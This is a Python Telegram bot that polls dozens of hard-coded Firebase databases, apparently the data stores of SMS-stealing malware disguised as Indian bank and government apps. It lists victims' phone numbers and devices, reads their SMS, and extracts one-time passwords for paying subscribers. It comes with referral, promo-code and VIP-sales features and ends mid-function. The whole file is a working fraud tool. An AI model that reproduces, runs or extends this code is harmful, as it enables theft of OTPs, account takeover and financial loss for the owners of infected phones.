#!/usr/bin/env python3
"""
OTP PANEL PRO — VIRAL GROWTH & EXTRACTOR EDITION (PRO EDITION)
═════════════════════════════════════════════════════════════
Features:
 - 100% Inline Interactive UI (Categorized Admin Submenus).
 - Force-join gate with active member-leave monitoring.
 - Verified Referral Gate (Prevents click-farming exploits).
 - Multi-Use Promo Engine with Pagination & Duplicate Protection.
 - User Search & Lookup (via ID, @username, or Forwarded Message).
 - Automated Database Pruning for 6-month expired inactive users.
 - VIP Subscription plans menu & Promo Code Engine.
 - Database JSON Export/Import (Backup & Restore from chat).
 - User Ban/Unban management.
 - Multi-panel switcher (Global DBs + User Personal DBs).
 - Deep SMS Scanner for hidden phone numbers.
 - Super Admin suite: Universal Media Broadcast, DB manager, Channel manager.
═════════════════════════════════════════════════════════════
"""

import asyncio
import json
import logging
import os
import re
import time
from datetime import datetime
from html import escape as html_escape
from typing import Optional, List, Dict, Any, Tuple

import aiohttp
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    ChatMemberUpdated,
)
from telegram.error import TelegramError
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ChatMemberHandler,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ---------------------------------------------------------------------------
# Configuration & Default Settings
# ---------------------------------------------------------------------------

DEFAULT_DATABASES = {
    "DB1": "https://aaaa-b3749-default-rtdb.firebaseio.com",
  "DB2": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
  "DB3": "https://comeback-5b876-default-rtdb.firebaseio.com",
  "DB4": "https://dogla-de225-default-rtdb.firebaseio.com",
  "DB5": "https://duuu-dc41d-default-rtdb.firebaseio.com",
  "DB6": "https://dyno-1b564-default-rtdb.firebaseio.com",
  "DB7": "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com",
  "DB8": "https://go-one-1b6b2-default-rtdb.firebaseio.com",
  "DB9": "https://gren-ff2af-default-rtdb.firebaseio.com",
  "DB10": "https://hdmax1-58366-default-rtdb.firebaseio.com",
  "DB11": "https://imdum-6e873-default-rtdb.firebaseio.com",
  "DB12": "https://kingbggbb-default-rtdb.firebaseio.com",
  "DB13": "https://kumarlive1-default-rtdb.firebaseio.com",
  "DB14": "https://lalannew5-default-rtdb.firebaseio.com",
  "DB15": "https://loda-5029e-default-rtdb.firebaseio.com",
  "DB16": "https://manuwa-bb70a-default-rtdb.firebaseio.com",
  "DB17": "https://money-ace2c-default-rtdb.firebaseio.com",
  "DB18": "https://mpari-6a6e5-default-rtdb.firebaseio.com",
  "DB19": "https://myabtar-default-rtdb.firebaseio.com",
  "DB20": "https://myapp-8228a-default-rtdb.firebaseio.com",
  "DB21": "https://newspreding-default-rtdb.firebaseio.com",
  "DB22": "https://nky0-a5870-default-rtdb.firebaseio.com",
  "DB23": "https://panel-wala-v16-default-rtdb.firebaseio.com",
  "DB24": "https://pehla-panel-green-default-rtdb.firebaseio.com",
  "DB25": "https://pm-kisan-01hfg-default-rtdb.firebaseio.com",
  "DB26": "https://pm-kisan-05jg-default-rtdb.firebaseio.com",
  "DB27": "https://pm-kishan-b3-default-rtdb.firebaseio.com",
  "DB28": "https://pm-kishan-b4-default-rtdb.firebaseio.com",
  "DB29": "https://pmsjdj-default-rtdb.firebaseio.com",
  "DB30": "https://privatesok-59944-default-rtdb.firebaseio.com",
  "DB31": "https://projectsb0810-default-rtdb.firebaseio.com",
  "DB32": "https://pvn7-a873a-default-rtdb.firebaseio.com",
  "DB33": "https://rahulcscperosnl-default-rtdb.firebaseio.com",
  "DB34": "https://rajputchuttad-default-rtdb.firebaseio.com",
  "DB35": "https://rameshwar-7okt-default-rtdb.firebaseio.com",
  "DB36": "https://rc-39-15-default-rtdb.firebaseio.com",
  "DB37": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
  "DB38": "https://risho-d4c66-default-rtdb.firebaseio.com",
  "DB39": "https://rto-47-b39f4-default-rtdb.firebaseio.com",
  "DB40": "https://rto9-d2b33-default-rtdb.firebaseio.com",
  "DB41": "https://rto91-2b27f-default-rtdb.firebaseio.com",
  "DB42": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
  "DB43": "https://rtochallan8-default-rtdb.firebaseio.com",
  "DB44": "https://rtomatrix-c1e78-default-rtdb.firebaseio.com",
  "DB45": "https://runjun-master-panel-default-rtdb.firebaseio.com",
  "DB46": "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
  "DB47": "https://server-1-c3501-default-rtdb.firebaseio.com",
  "DB48": "https://server-2-a095f-default-rtdb.firebaseio.com",
  "DB49": "https://server-3-e44be-default-rtdb.firebaseio.com",
  "DB50": "https://server-6-42c3b-default-rtdb.firebaseio.com",
  "DB51": "https://server14-c6551-default-rtdb.firebaseio.com",
  "DB52": "https://singhaana-6f199-default-rtdb.firebaseio.com",
  "DB53": "https://spy-25-default-rtdb.firebaseio.com",
  "DB54": "https://strom-90e84-default-rtdb.firebaseio.com",
  "DB55": "https://tillu-2-default-rtdb.firebaseio.com",
  "DB56": "https://u13667713-dc566-default-rtdb.firebaseio.com",
  "DB57": "https://u16714964-283ef-default-rtdb.firebaseio.com",
  "DB58": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
  "DB59": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
  "DB60": "https://u2519579-a31aa-default-rtdb.firebaseio.com",
  "DB61": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
  "DB62": "https://u25783858-e6739-default-rtdb.firebaseio.com",
  "DB63": "https://u2865726-eeb1f-default-rtdb.firebaseio.com",
  "DB64": "https://u40179853-987df-default-rtdb.firebaseio.com",
  "DB65": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
  "DB66": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
  "DB67": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
  "DB68": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
  "DB69": "https://u72328193-47b68-default-rtdb.firebaseio.com",
  "DB70": "https://u72749819-fa563-default-rtdb.firebaseio.com",
  "DB71": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
  "DB72": "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
  "DB73": "https://ultra-14-default-rtdb.firebaseio.com",
  "DB74": "https://ultra381144-d1af5-default-rtdb.firebaseio.com",
  "DB75": "https://vecna-82db2-default-rtdb.firebaseio.com",
  "DB76": "https://yono-sb41-default-rtdb.firebaseio.com",
  "DB77": "https://yourfirebase-default-rtdb.firebaseio.com",
  "DB78": "https://newrto30-default-rtdb.firebaseio.com",
  "DB79": "https://bandhan2-7jan-default-rtdb.firebaseio.com",
  "DB80": "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
  "DB81": "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
  "DB82": "https://samar95476-54eb9-default-rtdb.firebaseio.com",
  "DB83": "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
  "DB84": "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
  "DB85": "https://salasali6990-1171d-default-rtdb.firebaseio.com",
  "DB86": "https://strange-2e4aa-default-rtdb.firebaseio.com"
}
DATABASES = dict(DEFAULT_DATABASES)

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
BOT_USERNAME = os.getenv("BOT_USERNAME", "@nyxor_ji_bot").lstrip("@")
ADMIN_SUPPORT_HANDLE = os.getenv("ADMIN_SUPPORT", "@FLEXSAMAY").lstrip("@")
VIP_SUPPORT_HANDLE = os.getenv("VIP_SUPPORT", "@TH3GALAXY").lstrip("@")
DB_FILE = os.getenv("BOT_DB_FILE", "bot_database.json")

POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "60"))
DB_CONCURRENCY = max(1, int(os.getenv("DB_CONCURRENCY", "8")))
TYPE4_CONCURRENCY = max(1, int(os.getenv("TYPE4_CONCURRENCY", "10")))
PAGE_SIZE = 20
SMS_LIMIT = 10
TRIAL_MINUTES = 10

# Configurable by Admin (Stored in DB)
referral_reward_minutes = 60
vip_support_handle = VIP_SUPPORT_HANDLE
vip_plans_text = (
    "🌟 <b>1 Day VIP:</b> $0.50 / ₹30\n"
    "🌟 <b>7 Days VIP:</b> $2.00 / ₹150\n"
    "🌟 <b>30 Days VIP:</b> $5.00 / ₹400\n"
    "🌟 <b>Lifetime VIP:</b> $12.00 / ₹1000\n"
)
# Format: {"CODE": {"days": int, "uses_left": int, "redeemed_by": [user_ids]}}
promo_codes: dict[str, dict] = {}

try:
    ADMIN_IDS: set[int] = {
        int(value.strip())
        for value in os.getenv("ADMIN_IDS", "5385377266").split(",")
        if value.strip()
    }
except ValueError:
    ADMIN_IDS = set()

DEFAULT_FORCE_JOIN: List[Dict[str, str]] = [
    {"chat_id": "@KRYON_JI", "invite_link": "https://t.me/KRYON_JI", "display_name": "VIP CHANNEL"}
]
force_join_channels: List[Dict[str, str]] = []

# Runtime in-memory state
all_users: dict[int, dict] = {}
pending_action: dict[int, str] = {}
pending_data: dict[int, dict] = {}
user_page: dict[int, int] = {}
user_online_filter: dict[int, bool] = {}
global_device_cache: dict[str, list["Device"]] = {}
http_session: Optional[aiohttp.ClientSession] = None
_main_app: Optional[Application] = None


def log(message: str) -> None:
    print(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {message}", flush=True)


# ---------------------------------------------------------------------------
# Data Persistence (Safe Atomic Overwrite)
# ---------------------------------------------------------------------------

def save_data() -> None:
    try:
        temp_file = f"{DB_FILE}.tmp"
        with open(temp_file, "w", encoding="utf-8") as file:
            json.dump(
                {
                    "all_users": {str(key): value for key, value in all_users.items()},
                    "databases": DATABASES,
                    "force_join_channels": force_join_channels,
                    "admin_ids": list(ADMIN_IDS),
                    "promo_codes": promo_codes,
                    "settings": {
                        "referral_reward_minutes": referral_reward_minutes,
                        "vip_plans_text": vip_plans_text,
                        "vip_support_handle": vip_support_handle,
                    },
                },
                file,
                indent=2,
            )
        # Atomically replace to prevent corruption during unexpected crashes
        os.replace(temp_file, DB_FILE)
    except OSError as exc:
        log(f"Could not save data: {exc}")


def load_data() -> None:
    global DATABASES, force_join_channels, ADMIN_IDS, referral_reward_minutes, vip_plans_text, promo_codes, vip_support_handle
    if not os.path.exists(DB_FILE):
        DATABASES = dict(DEFAULT_DATABASES)
        force_join_channels = DEFAULT_FORCE_JOIN.copy()
        return

    try:
        with open(DB_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)

        for key, value in data.get("all_users", {}).items():
            all_users[int(key)] = value

        saved_dbs = data.get("databases")
        DATABASES = saved_dbs if saved_dbs else dict(DEFAULT_DATABASES)
        force_join_channels = data.get("force_join_channels", DEFAULT_FORCE_JOIN.copy())

        saved_admins = data.get("admin_ids", [])
        if saved_admins:
            ADMIN_IDS = set(int(a) for a in saved_admins)

        raw_promos = data.get("promo_codes", {})
        promo_codes = {}
        for code, val in raw_promos.items():
            if isinstance(val, int):
                promo_codes[code] = {"days": val, "uses_left": 1, "redeemed_by": []}
            elif isinstance(val, dict):
                promo_codes[code] = {
                    "days": int(val.get("days", 1)),
                    "uses_left": int(val.get("uses_left", 1)),
                    "redeemed_by": list(val.get("redeemed_by", [])),
                }

        settings = data.get("settings", {})
        referral_reward_minutes = settings.get("referral_reward_minutes", 60)
        vip_plans_text = settings.get("vip_plans_text", vip_plans_text)
        vip_support_handle = settings.get("vip_support_handle", VIP_SUPPORT_HANDLE)

    except (OSError, ValueError, TypeError) as exc:
        log(f"Could not load data: {exc}")


async def autosave_loop() -> None:
    while True:
        await asyncio.sleep(60)
        save_data()


async def auto_prune_database() -> None:
    """Removes user records whose access expired > 180 days ago and have 0 referrals."""
    while True:
        try:
            await asyncio.sleep(86400)  # Run once every 24 hours
            cutoff = time.time() - (180 * 86400)
            to_delete = []
            for uid, info in list(all_users.items()):
                if uid in ADMIN_IDS:
                    continue
                
                exp = float(info.get("access_until", 0.0))
                joined_str = info.get("joined_at", "")
                
                try:
                    joined_ts = datetime.fromisoformat(joined_str).timestamp() if joined_str else 0.0
                except Exception:
                    joined_ts = 0.0
                    
                # Evaluate against the later of their join date or expiry date
                last_active = max(exp, joined_ts)
                
                has_no_refs = len(info.get("referrals", [])) == 0
                has_no_dbs = len(info.get("custom_dbs", [])) == 0
                
                if 0 < last_active < cutoff and has_no_refs and has_no_dbs:
                    to_delete.append(uid)

            if to_delete:
                for uid in to_delete:
                    all_users.pop(uid, None)
                save_data()
                log(f"Auto-pruned {len(to_delete)} inactive user record(s).")
        except Exception as exc:
            log(f"Auto-pruning error: {exc}")


def user_record(user_id: int, user=None) -> dict:
    record = all_users.setdefault(
        user_id,
        {
            "name": getattr(user, "full_name", "Unknown") if user else "Unknown",
            "username": getattr(user, "username", "") or "" if user else "",
            "joined_at": datetime.now().isoformat(timespec="seconds"),
            "banned": False,
            "referrer_id": None,
            "referral_counted": False,
            "referrals": [],
            "access_until": 0.0,
            "trial_used": False,
            "custom_dbs": [],
            "selected_panel": "ALL",
        },
    )
    if user and getattr(user, "username", ""):
        record["username"] = user.username or record.get("username", "")
    if user and getattr(user, "full_name", ""):
        record["name"] = user.full_name or record.get("name", "Unknown")

    record.setdefault("custom_dbs", [])
    record.setdefault("selected_panel", "ALL")
    record.setdefault("banned", False)
    record.setdefault("referrals", [])
    record.setdefault("access_until", 0.0)
    record.setdefault("trial_used", False)
    return record


def is_banned(user_id: int) -> bool:
    return user_record(user_id).get("banned", False)


# ---------------------------------------------------------------------------
# Access, Trial & Referrals
# ---------------------------------------------------------------------------

def format_duration(minutes: int) -> str:
    if minutes < 60:
        return f"{minutes} minute(s)"
    hours, mins = divmod(minutes, 60)
    if mins == 0:
        return f"{hours} hour(s)"
    if hours >= 24:
        days, hrs = divmod(hours, 24)
        return f"{days}d {hrs}h"
    return f"{hours}h {mins}m"


def register_referrer(user_id: int, raw_referrer: Optional[str]) -> None:
    if not raw_referrer:
        return
    try:
        referrer_id = int(raw_referrer.removeprefix("ref_"))
    except ValueError:
        return
    if referrer_id == user_id or referrer_id not in all_users:
        return
    record = user_record(user_id)
    if record.get("referrer_id") is None and not record.get("referral_counted"):
        record["referrer_id"] = referrer_id


def access_expiry(user_id: int) -> float:
    return float(user_record(user_id).get("access_until", 0.0))


def has_access(user_id: int) -> bool:
    return user_id in ADMIN_IDS or access_expiry(user_id) > time.time()


def grant_trial(user_id: int) -> None:
    record = user_record(user_id)
    if record.get("trial_used"):
        return
    record["access_until"] = time.time() + (TRIAL_MINUTES * 60)
    record["trial_used"] = True
    save_data()


def access_remaining(user_id: int) -> str:
    remaining = max(0, int(access_expiry(user_id) - time.time()))
    if remaining == 0:
        return "0m"
    hours, remainder = divmod(remaining, 3600)
    minutes = remainder // 60
    if hours >= 24:
        days, hrs = divmod(hours, 24)
        return f"{days}d {hrs}h {minutes}m"
    return f"{hours}h {minutes}m" if hours > 0 else f"{minutes}m"


def referral_count(user_id: int) -> int:
    return len(user_record(user_id).get("referrals", []))


def referral_link(user_id: int) -> str:
    return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"


def complete_referral(user_id: int) -> bool:
    record = user_record(user_id)
    if record.get("referral_counted"):
        return False

    referrer_id = record.get("referrer_id")
    if not isinstance(referrer_id, int) or referrer_id == user_id:
        return False

    referrer = user_record(referrer_id)
    referrals = referrer.setdefault("referrals", [])
    if user_id in referrals:
        record["referral_counted"] = True
        save_data()
        return False

    record["referral_counted"] = True
    referrals.append(user_id)

    current_time = max(time.time(), access_expiry(referrer_id))
    referrer["access_until"] = current_time + (referral_reward_minutes * 60)
    save_data()
    return True


# ---------------------------------------------------------------------------
# Required Channel Verification & Gate
# ---------------------------------------------------------------------------

def channel_label(channel: Dict[str, str]) -> str:
    display_name = channel.get("display_name", "")
    if display_name:
        return display_name
    chat_id = channel.get("chat_id", "")
    return chat_id.lstrip("@") if chat_id.startswith("@") else chat_id or "Unknown"


def channel_username(channel: Dict[str, str]) -> str:
    return channel.get("chat_id", "")


def join_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for ch in force_join_channels:
        link = ch.get("invite_link", "")
        label = channel_label(ch)
        if link:
            rows.append([InlineKeyboardButton(f"📢 Join {label}", url=link)])
        else:
            rows.append([InlineKeyboardButton(f"📢 Join {label}", callback_data="noop")])
    rows.append([InlineKeyboardButton("✅ I Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)


async def missing_channels(bot, user_id: int) -> List[Dict[str, str]]:
    missing = []
    for ch in force_join_channels:
        chat_id = channel_username(ch)
        if not chat_id:
            continue
        try:
            member = await bot.get_chat_member(chat_id, user_id)
            if member.status not in {"member", "administrator", "creator"}:
                missing.append(ch)
        except TelegramError:
            missing.append(ch)
    return missing


async def channel_gate_message(update: Update, missing: Optional[List[Dict[str, str]]] = None) -> None:
    if not force_join_channels:
        return
    channels = missing if missing is not None else force_join_channels
    text = (
        "🔒 <b>Please Join Required Channels</b>\n\n"
        "You must join all required channels to access this bot.\n"
        "After joining, tap <b>I Joined — Verify</b> to unlock access.\n\n"
        "📢 <b>Required Channels:</b>\n"
        + "\n".join(f"• {html_escape(channel_label(ch))}" for ch in channels)
    )
    target = update.message or update.callback_query.message
    await target.reply_text(text, reply_markup=join_keyboard(), parse_mode="HTML")


async def ensure_channel_joined(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not force_join_channels:
        return True
    user_id = update.effective_user.id
    
    # Bypass channel requirement for admins to prevent lockouts
    if user_id in ADMIN_IDS:
        return True
        
    missing = await missing_channels(context.bot, user_id)
    if missing:
        await channel_gate_message(update, missing)
        return False
    return True


async def on_channel_leave(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    result = update.chat_member
    if not result:
        return

    old_status = result.old_chat_member.status
    new_status = result.new_chat_member.status

    if old_status in {"member", "administrator", "creator"} and new_status in {"left", "kicked"}:
        chat_id = str(result.chat.id)
        chat_username = f"@{result.chat.username}" if result.chat.username else ""

        is_required = any(
            ch.get("chat_id") == chat_id or ch.get("chat_id") == chat_username
            for ch in force_join_channels
        )

        if is_required:
            user_id = result.from_user.id
            if user_id in ADMIN_IDS:
                return
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"⚠️ <b>Access Suspended!</b>\n\nYou left <b>{result.chat.title}</b>. You must rejoin all required channels to continue using the bot.",
                    reply_markup=join_keyboard(),
                    parse_mode="HTML",
                )
            except TelegramError:
                pass


# ---------------------------------------------------------------------------
# Firebase Concurrent Device Fetcher
# ---------------------------------------------------------------------------

FIREBASE_TIMEOUT = aiohttp.ClientTimeout(total=5, connect=2)

async def get_http_session() -> aiohttp.ClientSession:
    global http_session
    if http_session is None or http_session.closed:
        http_session = aiohttp.ClientSession(timeout=FIREBASE_TIMEOUT)
    return http_session


async def firebase_get(path: str, base_url: str):
    try:
        session = await get_http_session()
        url = f"{base_url.rstrip('/')}/{path}.json" if path else f"{base_url.rstrip('/')}/.json"
        async with session.get(url) as response:
            if response.status != 200:
                return None
            return await response.json(content_type=None)
    except Exception:
        return None


async def firebase_keys(path: str, base_url: str) -> list[str]:
    try:
        session = await get_http_session()
        url = (
            f"{base_url.rstrip('/')}/{path}.json?shallow=true"
            if path
            else f"{base_url.rstrip('/')}/.json?shallow=true"
        )
        async with session.get(url) as response:
            if response.status != 200:
                return []
            data = await response.json(content_type=None)
            return list(data) if isinstance(data, dict) else []
    except Exception:
        return []


def format_number(value: str) -> str:
    digits = re.sub(r"\D", "", value)
    if digits.startswith("91") and len(digits) == 12:
        return f"+{digits}"
    if len(digits) == 10:
        return f"+91{digits}"
    return f"+{digits}" if len(digits) > 4 else digits


def number_from(value) -> Optional[str]:
    if value is None:
        return None
    raw = str(value)
    if len(re.sub(r"\D", "", raw)) <= 4:
        return None
    return format_number(raw)


def parse_battery(value) -> int:
    digits = re.sub(r"\D", "", str(value or ""))
    return int(digits) if digits else 0


def parse_status(value) -> str:
    if isinstance(value, bool):
        return "online" if value else "offline"
    return "online" if str(value or "").lower() == "online" else "offline"


class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag"
    )

    def __init__(self, device_id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = device_id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = list(dict.fromkeys(numbers))
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag


async def fetch_database(tag: str, base_url: str) -> list[Device]:
    devices = []
    added = set()
    try:
        root_keys, sim_all, info_all, user_data, clients = await asyncio.gather(
            firebase_keys("", base_url),
            firebase_get("All_Users/simDetails", base_url),
            firebase_get("All_Users/Data/DeviceInfo", base_url),
            firebase_get("user_data", base_url),
            firebase_get("clients", base_url),
        )

        if isinstance(sim_all, dict):
            info_all = info_all if isinstance(info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                if dev_id in added or not isinstance(sim, dict):
                    continue
                added.add(dev_id)
                numbers = [n for n in (number_from(sim.get("sim1Number")), number_from(sim.get("sim2Number"))) if n]
                info = info_all.get(dev_id) if isinstance(info_all.get(dev_id), dict) else {}
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices.append(
                    Device(
                        dev_id, model, parse_status(info.get("Status")), parse_battery(info.get("Battery")),
                        int(info.get("currentTimeMillis") or 0), numbers,
                        f"Model: {model}\nBrand: {info.get('Brand', '')}\nDevice ID: {dev_id}",
                        f"All_Users/sms/{dev_id}", base_url, tag,
                    )
                )

        if isinstance(user_data, dict):
            for dev_id, data in user_data.items():
                if dev_id in added or not isinstance(data, dict):
                    continue
                added.add(dev_id)
                numbers = [n for n in (number_from(data.get("numberSim1")), number_from(data.get("numberSim2")), number_from(data.get("mobNo"))) if n]
                name = data.get("d_name") or f"Device-{dev_id[:6]}"
                devices.append(
                    Device(
                        dev_id, name, parse_status(data.get("status")), parse_battery(data.get("battery")),
                        int(data.get("timestamp") or 0), numbers,
                        data.get("Device_info") or f"Device ID: {dev_id}", f"user_sms/{dev_id}", base_url, tag,
                    )
                )

        if isinstance(clients, dict):
            for dev_id, client in clients.items():
                if dev_id in added or not isinstance(client, dict):
                    continue
                numbers = []
                direct = number_from(client.get("mobNo"))
                if direct: numbers.append(direct)
                sims = client.get("sims")
                if isinstance(sims, list):
                    for sim in sims:
                        if isinstance(sim, dict):
                            snum = number_from(sim.get("phoneNumber"))
                            if snum: numbers.append(snum)
                if not numbers and not client.get("modelName"):
                    continue
                added.add(dev_id)
                name = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices.append(
                    Device(
                        dev_id, name, parse_status(client.get("status")), parse_battery(client.get("battery")),
                        0, numbers, f"Model: {name}\nDevice ID: {dev_id}", f"All_Users/sms/{dev_id}", base_url, tag,
                    )
                )

        type4_keys = [k for k in (root_keys or []) if len(k) == 16 and re.fullmatch(r"[0-9a-fA-F]+", k)]

        async def fetch_type4(dev_id: str):
            return await asyncio.gather(
                firebase_get(f"{dev_id}/deviceInfo", base_url),
                firebase_get(f"{dev_id}/simInfo", base_url),
                firebase_get(f"{dev_id}/heartbeat", base_url),
            )

        # Firebase can contain a large number of device roots.  Fetch them in
        # bounded batches so one refresh cannot create hundreds/thousands of
        # simultaneous HTTP requests and get the hosting process SIGKILLed.
        type4_results = []
        for start in range(0, len(type4_keys), TYPE4_CONCURRENCY):
            batch = type4_keys[start:start + TYPE4_CONCURRENCY]
            type4_results.extend(await asyncio.gather(*(fetch_type4(key) for key in batch)))

        for dev_id, (info, sim, heartbeat) in zip(type4_keys, type4_results):
            if dev_id in added or not isinstance(info, dict):
                continue
            numbers = []
            if isinstance(sim, dict):
                for sim_value in sim.values():
                    if isinstance(sim_value, dict):
                        num = number_from(sim_value.get("number"))
                        if num: numbers.append(num)
                        
            try:
                timestamp = int(heartbeat) if heartbeat else 0
            except (ValueError, TypeError):
                timestamp = 0
                
            status = "online" if timestamp and (time.time() * 1000 - timestamp) < 300000 else "offline"
            name = info.get("model") or info.get("brand") or f"Device-{dev_id[:6]}"
            devices.append(
                Device(
                    dev_id, name, status, 0, timestamp, numbers,
                    f"Model: {name}\nDevice ID: {dev_id}", f"{dev_id}/receivedSms", base_url, tag,
                )
            )
    except Exception:
        pass
    return devices


async def refresh_all_devices() -> None:
    dbs_to_poll = dict(DATABASES)
    for uid, uinfo in list(all_users.items()):
        custom_dbs = uinfo.get("custom_dbs", [])
        for i, db_url in enumerate(custom_dbs):
            if isinstance(db_url, str) and db_url.startswith(("http://", "https://")):
                dbs_to_poll[f"U_{uid}_{i}"] = db_url

    # Do not fan out to every Firebase project at once.  A burst of hundreds
    # of HTTP requests was the main deployment-time resource risk (exit -9).
    semaphore = asyncio.Semaphore(DB_CONCURRENCY)

    async def bounded_fetch(tag: str, url: str):
        async with semaphore:
            return tag, await fetch_database(tag, url)

    items = list(dbs_to_poll.items())
    for start in range(0, len(items), DB_CONCURRENCY):
        batch = items[start:start + DB_CONCURRENCY]
        results = await asyncio.gather(
            *(bounded_fetch(tag, url) for tag, url in batch),
            return_exceptions=True,
        )
        for result in results:
            if isinstance(result, tuple):
                tag, devices = result
                if isinstance(devices, list):
                    global_device_cache[tag] = devices


async def all_devices(user_id: int = None) -> list[Device]:
    devices = []
    if user_id:
        record = user_record(user_id)
        panel_pref = record.get("selected_panel", "ALL")
        valid_tags = []
        if panel_pref in ["ALL", "GLOBAL"]:
            valid_tags.extend(DATABASES.keys())
        if panel_pref in ["ALL", "CUSTOM"]:
            custom_count = len(record.get("custom_dbs", []))
            valid_tags.extend([f"U_{user_id}_{i}" for i in range(custom_count)])
        for tag in valid_tags:
            devices.extend(global_device_cache.get(tag, []))
    else:
        devices = [d for items in global_device_cache.values() for d in items]

    unique = {device.id: device for device in devices}
    return sorted(
        unique.values(),
        key=lambda i: (0 if i.status == "online" else 1, 0 if i.numbers else 1, -i.timestamp),
    )


async def device_poll_loop() -> None:
    # Give Telegram polling time to start before the first heavy refresh.
    await asyncio.sleep(5)
    while True:
        try:
            await refresh_all_devices()
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            log(f"Device refresh error: {exc}")
        await asyncio.sleep(POLL_INTERVAL)


# ---------------------------------------------------------------------------
# SMS Helpers & OTP Parsing
# ---------------------------------------------------------------------------

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{5})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(1)
    return None

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str:
        return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except Exception: pass
    return "N/A"

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    
    safe_body = html_escape(body)
    safe_sender = html_escape(sms.get('sender', 'Unknown'))
    safe_num = html_escape(num_label)
    
    lines = [f"🔑 OTP: <code>{otp}</code>"] if otp else []
    lines.append(f"👤 From: {safe_sender}\n📅 Date: {sms_date(sms)}")
    lines.append(f"📱 Number: {safe_num}\n\n💬 Message: {safe_body}")
    return "\n".join(lines), otp

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await firebase_get(device.sms_path, device.base_url)
    if not data:
        return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]


# ---------------------------------------------------------------------------
# Inline User Interface & Navigation
# ---------------------------------------------------------------------------

def device_label(device: Device) -> str:
    return " & ".join(device.numbers) if device.numbers else f"{device.name} ({device.id[:8]})"

def menu(user_id: int) -> InlineKeyboardMarkup:
    is_admin = user_id in ADMIN_IDS
    buttons = [
        [
            InlineKeyboardButton("📱 View Devices", callback_data="menu_devices"),
            InlineKeyboardButton("🔍 Search Number", callback_data="menu_search"),
        ],
        [
            InlineKeyboardButton("📡 Scan Hidden", callback_data="menu_scan_hidden"),
            InlineKeyboardButton("🎁 Refer & Earn", callback_data="referral"),
        ],
        [
            InlineKeyboardButton("➕ Add My Panel", callback_data="user_add_panel"),
            InlineKeyboardButton("🔄 Switch Panel", callback_data="user_switch_panel"),
        ],
        [
            InlineKeyboardButton("🎟 Redeem Promo", callback_data="user_redeem_promo"),
            InlineKeyboardButton("💳 Buy VIP Access", callback_data="menu_buy_sub"),
        ],
        [
            InlineKeyboardButton("👤 My Account", callback_data="menu_account"),
            InlineKeyboardButton("💬 Support / Help", url=f"https://t.me/{ADMIN_SUPPORT_HANDLE}")
        ],
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("🛡 Admin Control Panel", callback_data="menu_admin")])
    return InlineKeyboardMarkup(buttons)

def list_keyboard(devices: list[Device], page: int, user_id: int) -> InlineKeyboardMarkup:
    pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    rows = []

    for device in devices[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]:
        icon = "🟢" if device.status == "online" else "🔴"
        rows.append([InlineKeyboardButton(f"{icon} {device_label(device)}", callback_data=f"device:{device.id}")])

